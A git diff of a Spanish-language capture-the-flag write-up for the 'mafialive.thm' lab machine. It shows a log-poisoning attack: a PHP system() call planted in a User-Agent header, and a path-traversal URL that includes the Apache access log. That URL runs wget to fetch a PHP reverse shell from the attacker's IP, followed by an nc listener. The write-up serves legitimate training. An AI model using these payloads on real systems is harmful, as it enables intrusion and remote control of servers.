@@ -112,12 +112,18 @@ User-Agent: Mozilla/5.0 < ?php system('ls -la'); ? > Gecko/20100101 Firefox/136.
 
 ![Captura de pantalla 2025-04-24 161350](https://github.com/user-attachments/assets/cd1b236b-f0b6-4b8f-a07f-d9cdce43cf72)
 
-Puesto que ir haciendo esto para cada comando que se quiera lanzar es un engorro, se subirá un archivo con una *reverse shell* a este directorio para después ejecutarlo desde este y tener acceso a la máquina. La *reverse shell* es descargada de la página de *Github* de [pentestmonkeys](https://github.com/pentestmonkey/php-reverse-shell) y se debe adecuar a la IP y puerto de la máquina atacante que escucha. Sólo es necesario modificar las variables $ip (10.23.92.113) y $port (1234). Por un lado se crea un servidor con *Python3* como se ha hecho en otros CTF desde la carpeta donde se almacena el archivo con la *reverse*.
+Puesto que ir haciendo esto para cada comando que se quiera lanzar es un engorro, se subirá un archivo con una *reverse shell* a este directorio para después ejecutarlo desde este y tener acceso a la máquina. La *reverse shell* es descargada de la página de *Github* de [pentestmonkeys](https://github.com/pentestmonkey/php-reverse-shell) y se debe adecuar a la IP y puerto de la máquina atacante que escucha. Sólo es necesario modificar las variables $ip (10.23.92.113) y $port (1234). Por un lado se crea un servidor con **Python3** como se ha hecho en otros CTF desde la carpeta donde se almacena el archivo con la *reverse*.
 
 <code>python3 -m http.server 8000</code>
 
-Por otro lado, se volverá a utilizar la función de ejecucion *system* pero en este caso, en lugar de pasarle directamente el comando, se indicará una variable 'cmd' para que desde la barra de la *URL* se pueda indicar el comando a lanzar. De esta manera, es más ágil que el método que se estaba siguiendo anteriormente.
+Por otro lado, se volverá a utilizar la función de ejecucion *system* pero en este caso, en lugar de pasarle directamente el comando, se indicará una variable 'cmd' para que desde la barra de la *URL* se pueda indicar el comando a lanzar <code>system($_GET['cmd'])</code>. De esta manera, es más ágil que el método que se estaba siguiendo anteriormente. Con <code>wget</code> se procederá a descargar el archivo 'php-reverse-shell.php' indicando la IP de la máquina atacante y el puerto donde se encuetra el servidor creado (8000). De esta manera el 'acces_log' ejecutará la descarga en la carpeta '/development_testing'. La dirección introducida es la siguiente:
 
- <code>system($_GET['cmd'])</code>
- 
+<code>http://mafialive.thm/test.php?view=/var/www/html/development_testing//..//..//..//../%2fvar%2flog%2fapache2%2faccess.log&cmd=wget%20http://10.23.92.113:8000/php-reverse-shell.php</code>
+
+Para ejecutar la *reverse shell* sólo es necesario indicar la dirección del archivo en la barra *URL*, no sin antes poner en escucha en nuestra máquina el puerto '1234' con la herramienta **Netcat**.
+
+<code>nc -lvnp 1234</code>
+
+![Captura de pantalla 2025-04-25 135922](https://github.com/user-attachments/assets/d1328e57-dad6-48a6-bfe9-6b19c5fee614)
+
 **Flag:**
